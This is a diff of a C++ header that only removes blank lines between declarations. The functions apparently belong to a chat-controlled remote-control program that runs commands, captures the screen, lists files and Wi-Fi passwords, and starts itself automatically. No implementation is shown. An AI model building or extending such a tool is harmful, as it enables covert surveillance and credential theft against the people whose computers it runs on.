@@ -33,74 +33,39 @@ extern const string CHAT_ID;
 extern const string VERSION;
 
 inline bool filexits(const string& name);
-
 json bad_json();
-
 json GetLastMessage();
-
 int ChangeVolume(double nVolume = -1, bool bScalar = 0);
-
 void setID(string newID);
-
 void press(char a, bool bigone = 0);
-
 string get_exe();
-
 string get_path();
-
-
 string url_encode(const string& value);
-
 void Send(string to_send);
 void SendPhoto(string path);
-
 string exec(const char* cmd);
-
-
 void ListIpAddresses();
-
 BOOL IsProcessElevated();
-
 string uptime();
-
 string hostname();
-
 string public_ip();
 string admin_rights();
-
 string Cursor_Position();
-
 string DiskList();
-
 string getStatus();
-
 string random_string(int lenght);
 void autostart();
-
 void hotkeys(string hotkey);
-
 void logo();
-
 double time_lenght(time_t start, time_t stop);
-
 void Remove(string path);
-
 void startup();
-
-
 void help(string parameters);
-
 BITMAPINFOHEADER createBitmapHeader(int width, int height);
-
 Mat captureScreenMat(HWND hwnd);
-
 bool is_path(const string& path);
-
 string ListOfFiles(string path);
-
 string get_ListOfWifiPasswords();
 void CloseForeground();
-
 void StartStopClosingForeground(bool switcH);
-
 void toClipboard(HWND hwnd, const std::string& s);
